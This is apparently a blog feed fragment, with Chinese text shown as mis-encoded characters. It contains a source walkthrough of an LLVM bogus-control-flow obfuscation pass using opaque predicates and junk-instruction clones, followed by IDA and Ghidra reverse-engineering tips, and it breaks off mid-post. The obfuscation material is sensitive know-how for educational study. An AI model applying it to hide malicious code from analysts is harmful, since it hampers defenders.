class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ··æ·†è½®æ•°ï¼ˆObfTimesï¼‰å’Œæ¦‚ç‡å‚æ•°ï¼ˆObfProbRateï¼‰æ˜¯å¦åˆæ³•ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">toObfuscate</span>(flag,&amp;F,<span class="string">&quot;bcf&quot;</span>)) &#123; <span class="comment">//åˆ¤æ–­æ­¤å‡½æ•°æ˜¯å¦è¦æ··æ·†</span></span><br><span class="line">      <span class="built_in">bogus</span>(F);</span><br><span class="line">      <span class="built_in">doF</span>(*F.<span class="built_in">getParent</span>());    <span class="comment">//åœ¨å…¨æ¨¡å—å±‚é¢åšä¸€æ¬¡doFï¼ˆå…¨å±€ä¿®é¥°ï¼Œä¾‹å¦‚æ··æ·†æ‰€æœ‰æ’çœŸçš„æ¡ä»¶ï¼‰</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="comment">// end of runOnFunction()</span></span><br></pre></td></tr></table></figure><h3 id="éšæœºé€‰æ‹©ã€éå†æ¯ä¸ªåŸºæœ¬å—"><a href="#éšæœºé€‰æ‹©ã€éå†æ¯ä¸ªåŸºæœ¬å—" class="headerlink" title="éšæœºé€‰æ‹©ã€éå†æ¯ä¸ªåŸºæœ¬å—"></a>éšæœºé€‰æ‹©ã€éå†æ¯ä¸ªåŸºæœ¬å—</h3><p><code>bogus(F)</code>çš„ä¸»è¦é€»è¾‘æ˜¯ï¼šå¾ªç¯è¦æ··æ·†å¤šå°‘è½®ï¼Œæ¯è½®éå†å‡½æ•°å½“å‰å…¨éƒ¨åŸºæœ¬å—ã€‚å¯¹æ¯ä¸ªBasicBlockæŒ‰æ¦‚ç‡ ObfProbRate éšæœºå†³å®šæ˜¯å¦æ’å…¥è™šå‡æ§åˆ¶æµâ€”â€”é€‰ä¸­åè°ƒç”¨addBogusFlow(basicBlock, F)ã€‚å…¶ä¸­æ’å…¥è™šå‡æµç¨‹ä¼šå¯¼è‡´æ–°ç”Ÿæˆ3ä¸ªåŸºæœ¬å—ï¼Œå› æ­¤ç»Ÿè®¡é‡éœ€ç›¸åº”è‡ªå¢ã€‚æ¯ä¸€è½®å¾ªç¯å¤„ç†åï¼ŒfirstTimeä½è®¾ä¸ºfalseï¼Œé¿å…é‡å¤åˆå§‹åŒ–ç»Ÿè®¡å˜é‡ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">bogus</span><span class="params">(Function &amp;F)</span> </span>&#123;</span><br><span class="line">    ++NumFunction;              </span><br><span class="line">    <span class="type">int</span> NumBasicBlocks = <span class="number">0</span>;     </span><br><span class="line">    <span class="type">bool</span> firstTime = <span class="literal">true</span>;      </span><br><span class="line">    <span class="type">bool</span> hasBeenModified = <span class="literal">false</span>; </span><br><span class="line">    <span class="type">int</span> NumObfTimes = ObfTimes;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        std::list&lt;BasicBlock *&gt; basicBlocks;</span><br><span class="line">        <span class="comment">// --- 1. æŠŠå½“å‰Fçš„æ‰€æœ‰åŸºæœ¬å—æ”¶é›†åˆ°listé‡Œ ---</span></span><br><span class="line">        <span class="keyword">for</span>(Function::iterator i = F.<span class="built_in">begin</span>(); i != F.<span class="built_in">end</span>(); ++i)&#123;</span><br><span class="line">            basicBlocks.<span class="built_in">push_back</span>(&amp;*i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- 2. éå†æ‰€æœ‰åŸºæœ¬å—ï¼ŒæŒ‰æ¦‚ç‡æŒ‘é€‰ ---</span></span><br><span class="line">        <span class="keyword">while</span>(!basicBlocks.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            NumBasicBlocks ++;</span><br><span class="line">            BasicBlock *basicBlock = basicBlocks.<span class="built_in">front</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// -- 3. æŒ‰æ¦‚ç‡å†³å®šæ˜¯å¦å¯¹è¯¥å—æ··æ·† --</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)cryptoutils-&gt;<span class="built_in">get_range</span>(<span class="number">100</span>) &lt; ObfProbRate)&#123;</span><br><span class="line">                hasBeenModified = <span class="literal">true</span>;</span><br><span class="line">                ++NumModifiedBasicBlocks;        <span class="comment">// æ··æ·†çš„å—è®¡æ•°</span></span><br><span class="line">                NumAddedBasicBlocks += <span class="number">3</span>;        <span class="comment">// æ¯æ¬¡æ–°å¢3ä¸ªBB</span></span><br><span class="line">                FinalNumBasicBlocks += <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// --- æ ¸å¿ƒï¼šå¯¹è¯¥å—åšbogusæ··æ·† ----</span></span><br><span class="line">                <span class="built_in">addBogusFlow</span>(basicBlock, F);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// -- 4. popæ‰å·²ç»å¤„ç†è¿‡çš„å— --</span></span><br><span class="line">            basicBlocks.<span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// -- 5. ç¬¬ä¸€æ¬¡éå†æ—¶ï¼Œç”¨äºè®°å½•ç»Ÿè®¡ --</span></span><br><span class="line">            <span class="keyword">if</span>(firstTime)&#123;</span><br><span class="line">                ++InitNumBasicBlocks;</span><br><span class="line">                ++FinalNumBasicBlocks;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        firstTime = <span class="literal">false</span>;         <span class="comment">// åªåœ¨ç¬¬ä¸€è½®åˆå§‹åŒ–æ—¶ç»Ÿè®¡</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(--NumObfTimes &gt; <span class="number">0</span>);       <span class="comment">// è§†æ··æ·†è½®æ•°å¤šæ¬¡å åŠ </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="æ‹†åˆ†åŸºæœ¬å—ï¼Œåˆ¶é€ åˆ†æ”¯ç‚¹"><a href="#æ‹†åˆ†åŸºæœ¬å—ï¼Œåˆ¶é€ åˆ†æ”¯ç‚¹" class="headerlink" title="æ‹†åˆ†åŸºæœ¬å—ï¼Œåˆ¶é€ åˆ†æ”¯ç‚¹"></a>æ‹†åˆ†åŸºæœ¬å—ï¼Œåˆ¶é€ åˆ†æ”¯ç‚¹</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BasicBlock::iterator i1 = basicBlock-&gt;<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">if</span>(basicBlock-&gt;<span class="built_in">getFirstNonPHIOrDbgOrLifetime</span>())</span><br><span class="line">    i1 = (BasicBlock::iterator)basicBlock-&gt;<span class="built_in">getFirstNonPHIOrDbgOrLifetime</span>();</span><br><span class="line">Twine *var = <span class="keyword">new</span> <span class="built_in">Twine</span>(<span class="string">&quot;originalBB&quot;</span>);</span><br><span class="line">BasicBlock *originalBB = basicBlock-&gt;<span class="built_in">splitBasicBlock</span>(i1, *var);</span><br></pre></td></tr></table></figure><p>å°†å½“å‰basicBlockæŒ‰ç…§é¦–ä¸ªéphiä¸éè°ƒè¯•/å£°æ˜ä½œç”¨åŸŸæŒ‡ä»¤æ‹†åˆ†ï¼šç¬¬ä¸€å—åªä¿ç•™phiä¸å¿…è¦çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå‰©ä½™çš„å†…å®¹æ–°ç”Ÿæˆ originalBBã€‚è¿™æ ·åç»­æ’å…¥åˆ†æ”¯æ—¶å¯ä¿è¯iråˆæ³•æ€§ï¼Œä¸ä¼šç ´åphiå˜é‡ã€‚æ–°originalBBæˆäº†æ’å…¥è·³è½¬çš„ç›®æ ‡ã€‚</p><h3 id="åˆ›å»ºåŸå§‹å—çš„å˜å½¢å‰¯æœ¬"><a href="#åˆ›å»ºåŸå§‹å—çš„å˜å½¢å‰¯æœ¬" class="headerlink" title="åˆ›å»ºåŸå§‹å—çš„å˜å½¢å‰¯æœ¬"></a>åˆ›å»ºåŸå§‹å—çš„å˜å½¢å‰¯æœ¬</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Twine * var3 = <span class="keyword">new</span> <span class="built_in">Twine</span>(<span class="string">&quot;alteredBB&quot;</span>);</span><br><span class="line">BasicBlock *alteredBB = <span class="built_in">createAlteredBasicBlock</span>(originalBB, *var3, &amp;F);</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆäº†ä¸€ä»½originalBBçš„æ·±æ‹·è´ï¼Œå¹¶æŒ‰åç»­ä»£ç åœ¨å…¶ä¸­é—´éšæœºæ’å…¥äº†åƒåœ¾æŒ‡ä»¤</p><h3 id="æ§åˆ¶æµæ‰‡å‡ºä¸æ’å…¥æ’çœŸåˆ¤å®š"><a href="#æ§åˆ¶æµæ‰‡å‡ºä¸æ’å…¥æ’çœŸåˆ¤å®š" class="headerlink" title="æ§åˆ¶æµæ‰‡å‡ºä¸æ’å…¥æ’çœŸåˆ¤å®š"></a>æ§åˆ¶æµæ‰‡å‡ºä¸æ’å…¥æ’çœŸåˆ¤å®š</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡†å¤‡æ¡ä»¶æ’ä¸ºçœŸçš„IR</span></span><br><span class="line">Value * LHS = ConstantFP::<span class="built_in">get</span>(Type::<span class="built_in">getFloatTy</span>(F.<span class="built_in">getContext</span>()), <span class="number">1.0</span>);</span><br><span class="line">Value * RHS = ConstantFP::<span class="built_in">get</span>(Type::<span class="built_in">getFloatTy</span>(F.<span class="built_in">getContext</span>()), <span class="number">1.0</span>);</span><br><span class="line">Twine * var4 = <span class="keyword">new</span> <span class="built_in">Twine</span>(<span class="string">&quot;condition&quot;</span>);</span><br><span class="line">FCmpInst * condition = <span class="keyword">new</span> <span class="built_in">FCmpInst</span>(*basicBlock, FCmpInst::FCMP_TRUE , LHS, RHS, *var4);</span><br><span class="line">BranchInst::<span class="built_in">Create</span>(originalBB, alteredBB, (Value *)condition, basicBlock);</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šå°±æ˜¯1.0å’Œ1.0åšæµ®ç‚¹æ¯”è¾ƒï¼Œè°“è¯FCMP_TRUEä»£è¡¨â€œæ°¸è¿œä¸ºçœŸâ€ã€‚<br>å†ç”¨å®ƒæ„é€ æ¡ä»¶åˆ†æ”¯ï¼Œå¦‚æœ condition ä¸ºçœŸè·³ originalBBï¼Œå¦åˆ™è·³ alteredBBã€‚<br>ä½†å®é™…ä¸Šä¸€ç›´èµ° originalBBã€‚æœ€åä¼šç”±doFå°†è¯¥æ’çœŸåˆ¤æ–­æ›¿æ¢æˆæ›´å¤æ‚çš„è¡¨è¾¾å¼ã€‚</p><h3 id="è®©alteredBBå¾ªç¯å›originalBB"><a href="#è®©alteredBBå¾ªç¯å›originalBB" class="headerlink" title="è®©alteredBBå¾ªç¯å›originalBB"></a>è®©alteredBBå¾ªç¯å›originalBB</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BranchInst::<span class="built_in">Create</span>(originalBB, alteredBB);</span><br></pre></td></tr></table></figure><p>alteredBB çš„ç»ˆæ­¢æŒ‡ä»¤ç›´æ¥è·³å› originalBB</p><h3 id="å†æ¬¡æ‹†åˆ†-originalBB-çš„ç»“å°¾ï¼Œä¼ªé€ -return-alteredBF-è·³è½¬"><a href="#å†æ¬¡æ‹†åˆ†-originalBB-çš„ç»“å°¾ï¼Œä¼ªé€ -return-alteredBF-è·³è½¬" class="headerlink" title="å†æ¬¡æ‹†åˆ† originalBB çš„ç»“å°¾ï¼Œä¼ªé€  return / alteredBF è·³è½¬"></a>å†æ¬¡æ‹†åˆ† originalBB çš„ç»“å°¾ï¼Œä¼ªé€  return / alteredBF è·³è½¬</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BasicBlock::iterator i = originalBB-&gt;<span class="built_in">end</span>();</span><br><span class="line">Twine * var5 = <span class="keyword">new</span> <span class="built_in">Twine</span>(<span class="string">&quot;originalBBpart2&quot;</span>);</span><br><span class="line">BasicBlock * originalBBpart2 = originalBB-&gt;<span class="built_in">splitBasicBlock</span>(--i , *var5);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// åœ¨ originalBB æœ«å°¾å†æ’å…¥ä¸€æ¡æ’ä¸ºçœŸçš„åˆ¤æ–­</span></span><br><span class="line">Twine * var6 = <span class="keyword">new</span> <span class="built_in">Twine</span>(<span class="string">&quot;condition2&quot;</span>);</span><br><span class="line">FCmpInst * condition2 = <span class="keyword">new</span> <span class="built_in">FCmpInst</span>(*originalBB, CmpInst::FCMP_TRUE , LHS, RHS, *var6);</span><br><span class="line">BranchInst::<span class="built_in">Create</span>(originalBBpart2, alteredBB, (Value *)condition2, originalBB);</span><br></pre></td></tr></table></figure><h3 id="å…‹éš†åŸå§‹åŸºæœ¬å—å¹¶æ’å…¥åƒåœ¾æŒ‡ä»¤"><a href="#å…‹éš†åŸå§‹åŸºæœ¬å—å¹¶æ’å…¥åƒåœ¾æŒ‡ä»¤" class="headerlink" title="å…‹éš†åŸå§‹åŸºæœ¬å—å¹¶æ’å…¥åƒåœ¾æŒ‡ä»¤"></a>å…‹éš†åŸå§‹åŸºæœ¬å—å¹¶æ’å…¥åƒåœ¾æŒ‡ä»¤</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BasicBlock * alteredBB = llvm::<span class="built_in">CloneBasicBlock</span> (basicBlock, VMap, Name, F);</span><br><span class="line"><span class="comment">// ä¸ºæ¯æ¡æŒ‡ä»¤åšoperand/Phi remapç­‰</span></span><br><span class="line"><span class="comment">// ...éå† alteredBB-&gt;begin(), e= alteredBB-&gt;end()</span></span><br><span class="line"><span class="comment">// æ ¹æ®opcodeéšæœºæ’å…¥è¯¸å¦‚å–å&amp;åŠ æ³•/ç§»ä½/ä¹˜æ³•ç­‰å†—ä½™åƒåœ¾ç®—æœ¯æ“ä½œ</span></span><br></pre></td></tr></table></figure><p>ç”¨ LLVM æä¾›çš„ CloneBasicBlock API æ·±æ‹·è´ä¸€ä¸ªIRåŸºæœ¬å—ï¼Œç„¶åå¯¹å…¶ä¸­æ¯æ¡æŒ‡ä»¤åšå‚æ•°å’Œ phi èŠ‚ç‚¹ç­‰çš„ remappingï¼Œä¿è¯å„æŒ‡å‘æ­£ç¡®ï¼Œç„¶åæŒ‰ç…§ç±»å‹ç»§ç»­åœ¨åˆé€‚ä½ç½®æ’å…¥åƒåœ¾æŒ‡ä»¤ã€‚</p><h3 id="å…¨å±€æ›¿æ¢æ’çœŸåˆ¤å®šæ¡ä»¶"><a href="#å…¨å±€æ›¿æ¢æ’çœŸåˆ¤å®šæ¡ä»¶" class="headerlink" title="å…¨å±€æ›¿æ¢æ’çœŸåˆ¤å®šæ¡ä»¶"></a>å…¨å±€æ›¿æ¢æ’çœŸåˆ¤å®šæ¡ä»¶</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ï¼ˆ1ï¼‰éå†æ‰¾æ‰€æœ‰ FCMP_TRUE çš„åˆ†æ”¯</span></span><br><span class="line"><span class="comment">//ï¼ˆ2ï¼‰ç»Ÿä¸€æ›¿æ¢æˆå¤æ‚ä¸é€æ˜è°“è¯ï¼š(y &lt; 10) || ((x*(x+1)) % 2 == 0)</span></span><br><span class="line">opX = <span class="keyword">new</span> <span class="built_in">LoadInst</span> ((Value *)x, <span class="string">&quot;&quot;</span>, (*i));</span><br><span class="line">opY = <span class="keyword">new</span> <span class="built_in">LoadInst</span> ((Value *)y, <span class="string">&quot;&quot;</span>, (*i));</span><br><span class="line">op = BinaryOperator::<span class="built_in">Create</span>(Instruction::Sub, (Value *)opX,</span><br><span class="line">    ConstantInt::<span class="built_in">get</span>(Type::<span class="built_in">getInt32Ty</span>(M.<span class="built_in">getContext</span>()), <span class="number">1</span>, <span class="literal">false</span>), <span class="string">&quot;&quot;</span>, (*i));</span><br><span class="line">op1 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Mul, (Value *)opX, op, <span class="string">&quot;&quot;</span>, (*i));</span><br><span class="line">op = BinaryOperator::<span class="built_in">Create</span>(Instruction::URem, op1,</span><br><span class="line">    ConstantInt::<span class="built_in">get</span>(Type::<span class="built_in">getInt32Ty</span>(M.<span class="built_in">getContext</span>()), <span class="number">2</span>, <span class="literal">false</span>), <span class="string">&quot;&quot;</span>, (*i));</span><br><span class="line">condition = <span class="keyword">new</span> <span class="built_in">ICmpInst</span>((*i), ICmpInst::ICMP_EQ, op,</span><br><span class="line">    ConstantInt::<span class="built_in">get</span>(Type::<span class="built_in">getInt32Ty</span>(M.<span class="built_in">getContext</span>()), <span class="number">0</span>, <span class="literal">false</span>));</span><br><span class="line">condition2 = <span class="keyword">new</span> <span class="built_in">ICmpInst</span>((*i), ICmpInst::ICMP_SLT, opY,</span><br><span class="line">    ConstantInt::<span class="built_in">get</span>(Type::<span class="built_in">getInt32Ty</span>(M.<span class="built_in">getContext</span>()), <span class="number">10</span>, <span class="literal">false</span>));</span><br><span class="line">op1 = BinaryOperator::<span class="built_in">Create</span>(Instruction::Or, (Value *)condition,</span><br><span class="line">    (Value *)condition2, <span class="string">&quot;&quot;</span>, (*i));</span><br><span class="line">BranchInst::<span class="built_in">Create</span>(((BranchInst*)*i)-&gt;<span class="built_in">getSuccessor</span>(<span class="number">0</span>),</span><br><span class="line">    ((BranchInst*)*i)-&gt;<span class="built_in">getSuccessor</span>(<span class="number">1</span>),(Value *) op1,</span><br><span class="line">    ((BranchInst*)*i)-&gt;<span class="built_in">getParent</span>());</span><br><span class="line">(*i)-&gt;<span class="built_in">eraseFromParent</span>();</span><br></pre></td></tr></table></figure><p>æ€»è€Œè¨€ä¹‹æ˜¯å°†æ‰€æœ‰çš„å‡è·³è½¬å¤æ‚åŒ–</p><h3 id="pass-æ··æ·†æ€è·¯æ ¸å¿ƒ"><a href="#pass-æ··æ·†æ€è·¯æ ¸å¿ƒ" class="headerlink" title="pass æ··æ·†æ€è·¯æ ¸å¿ƒ"></a>pass æ··æ·†æ€è·¯æ ¸å¿ƒ</h3><p>1ã€éšæœºé€‰å–åŸºæœ¬å—<br>2ã€å°†å…¶ä¸€æ‹†ä¸‰ï¼Œå¹¶æ„é€ å†—ä½™always-trueæ¡ä»¶å’Œè™šå‡åˆ†æ”¯<br>3ã€æ’å…¥å¸¦æœ‰åƒåœ¾æŒ‡ä»¤çš„alteredå‰¯æœ¬å—<br>4ã€ç®—æ³•å®Œæˆåï¼Œå†æŠŠè¿™äº›æ’çœŸçš„ predicate å…¨å˜æˆå¤æ‚çš„â€œä¸é€æ˜è°“è¯â€<br>5ã€è¾¾åˆ°æ§åˆ¶æµä¸ç¬¦å·æµåˆ†æéš¾åº¦å¤§å¹…æå‡çš„æ•ˆæœ</p>]]></content>
      
      
      <categories>
          
          <category> æºç é˜…è¯» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> obfuscation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDAä½¿ç”¨æŠ€å·§</title>
      <link href="/2025/03/26/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2025/03/26/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸¤å¤©åšé¢˜çš„æ—¶å€™åŒå±Šçš„pwnå¸ˆå‚…sakuraæ¥é—®æœ‰æ²¡æœ‰å¯ä»¥ä¿®æ”¹IDAå±€éƒ¨å˜é‡çš„æ–¹æ³•ã€‚ç ”ç©¶äº†ä¸€ä¸‹æ„Ÿè§‰å¾ˆæœ‰æ„æ€ï¼Œäºæ˜¯å•ç‹¬å¼€ä¸€ç¯‡æ–‡ç« è®°å½•æˆ‘ç»å¸¸ç”¨åˆ°çš„IDAå°æŠ€å·§ã€‚</p><h1 id="ä¿®æ”¹å±€éƒ¨å˜é‡"><a href="#ä¿®æ”¹å±€éƒ¨å˜é‡" class="headerlink" title="ä¿®æ”¹å±€éƒ¨å˜é‡"></a>ä¿®æ”¹å±€éƒ¨å˜é‡</h1><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>IDAæœ‰ä¸¤ç§å®ç°æ–¹å¼ï¼Œæˆ‘åœ¨ç½‘ä¸ŠæŸ¥åˆ°å¯ä»¥force new variableï¼Œä½†æ˜¯æˆ‘ä¸€ç›´æ²¡æˆåŠŸã€‚</p><h3 id="å®ç°æ•ˆæœï¼š"><a href="#å®ç°æ•ˆæœï¼š" class="headerlink" title="å®ç°æ•ˆæœï¼š"></a>å®ç°æ•ˆæœï¼š</h3><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260152493.png" alt=""></p><h3 id="æ­¥éª¤ï¼š"><a href="#æ­¥éª¤ï¼š" class="headerlink" title="æ­¥éª¤ï¼š"></a>æ­¥éª¤ï¼š</h3><p>å› ä¸ºå¯ä»¥è§‚å¯Ÿåˆ°éƒ½æ˜¯åˆ†å¼€èµ‹å€¼çš„</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260206208.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260207597.png" alt=""></p><p>æˆ‘ä»¬åœ¨var_5é‚£è¾¹æŒ‰U</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260211783.png" alt=""></p><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åˆ†å‡ºä¸€ä¸ªchar+intï¼Œå› ä¸ºæˆ‘å¾—éœ€æ±‚æ˜¯è®©v2[0]å•ç‹¬åˆ†å‡ºæ¥å˜æˆcharï¼Œv2[1]-v2[4]å˜æˆå››å­—èŠ‚çš„intï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©1+4</p><p>åœ¨01çš„åœ°æ–¹æŒ‰Né‡å‘½åæˆiï¼Œåœ¨05çš„åœ°æ–¹é€‰æ‹©å»ºç«‹æ•°ç»„ï¼ˆå¯ä»¥æŒ‰Aï¼‰åœ¨Næˆopcode</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260220412.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260222223.png" alt=""></p><p>å›åˆ°executeBrainfuckæŒ‰F5</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260223664.png" alt=""></p><p>æ¥ç€æ¥æ”¹æ±‡ç¼–</p><p>å› ä¸ºIDAåœ¨åç¼–è¯‘çš„æ—¶å€™ï¼Œä¼šæ ¹æ®å˜é‡çš„è®¿é—®æ–¹å¼å’ŒæŒ‡ä»¤æ¥æ¨æ–­å˜é‡ç±»å‹</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260230570.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [rbp+opcode+1], 0  ; èµ‹å€¼äº† 4 ä¸ªå­—èŠ‚</span><br></pre></td></tr></table></figure><p>opcode[1]ä¹‹åæ˜¯ 4 ä¸ªè¿ç»­çš„å­—èŠ‚ï¼ŒIDAä¼šæ¨æµ‹opcode[5]è¿™æ ·çš„å­˜å‚¨</p><p>æˆ‘ä»¬æŠŠå®ƒnopæ‰</p><p>1ã€<code>opcode+1</code>å­—èŠ‚æ•°æ˜¾ç€åœ°<code>4</code>åˆå§‹åŒ–ï¼ŒIDA æ— æ³•ç¡®è®¤å®ƒæ˜¯å†…å­˜çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤å¯èƒ½ä¼šè¢«æ‹†é™¤<code>int</code>ã€‚</p><p>2.IDAåå‘äºæœ€ç®€å•çš„æ•°æ®ç»“æ„ï¼Œå› æ­¤<code>[rbp-5h]</code>ç›´æ¥èµ‹å€¼<code>signed __int8 opcode</code>ï¼Œè€Œ<code>[rbp-4h]</code>ä½œä¸º<code>int opcode_1</code>å¤„ç†ã€‚</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260234728.png" alt=""></p><p>åœ¨opcodeé‚£é‡ŒæŒ‰Yè½¬æ¢å‡½æ•°ç±»å‹+æŒ‰Né‡å‘½åiå°±å¥½äº†</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260236267.jpg" alt=""></p><h2 id="Ghidraä¸€æŠŠæ¢­"><a href="#Ghidraä¸€æŠŠæ¢­" class="headerlink" title="Ghidraä¸€æŠŠæ¢­"></a>Ghidraä¸€æŠŠæ¢­</h2><p>è€ƒè™‘åˆ°æ˜¯pwnçš„å¸ˆå‚…ï¼Œæ‰€ä»¥ä¸æ¨èï¼ˆï¼‰ghidraæŒºéº»çƒ¦çš„ä½†æ˜¯è¶³å¤Ÿåº•å±‚ï¼Œç¡®å®å¥½ç”¨</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260158257.jpg" alt=""></p><h1 id="ä¼ªä»£ç å¯¹åº”æ±‡ç¼–"><a href="#ä¼ªä»£ç å¯¹åº”æ±‡ç¼–" class="headerlink" title="ä¼ªä»£ç å¯¹åº”æ±‡ç¼–"></a>ä¼ªä»£ç å¯¹åº”æ±‡ç¼–</h1><p>å¯ä»¥å®ç°ç‚¹ä¼ªä»£ç å“ªé‡Œæ±‡ç¼–ä¼šç›¸åº”è·³è½¬ï¼Œæ±‡ç¼–åŒç†ï¼Œpatchçš„æ—¶å€™å¥½ç”¨</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503260202020.png" alt=""></p><h1 id="ä¿®å¤æšä¸¾å€¼"><a href="#ä¿®å¤æšä¸¾å€¼" class="headerlink" title="ä¿®å¤æšä¸¾å€¼"></a>ä¿®å¤æšä¸¾å€¼</h1><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503261654447.png" alt=""></p><p>ä»¥ptraceå‡½æ•°ä¸ºä¾‹ï¼Œè¿™é‡Œçš„12LLè¡¨ç¤ºä¸€ä¸ªåŠŸèƒ½å·ã€‚åœ¨12ä¸Šé¢æŒ‰Mï¼Œç‚¹å‡»yesï¼Œctrl+Fæœç´¢ptraceï¼Œè¿™é‡Œæ˜¯PTRACE_GETREGS</p><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202503261657409.png" alt=""></p><h1 id="positive-sp-value"><a href="#positive-sp-value" class="headerlink" title="positive sp value"></a>positive sp value</h1><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507110038454.png" alt=""></p><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>å‡½æ•°å †æ ˆä¸å¹³è¡¡ï¼š<br>1ã€å‡½æ•°å¤´å°¾æ˜¯å¦å¹³è¡¡<br>2ã€æ°¸å‡è·³è½¬&amp;ç ´åæ 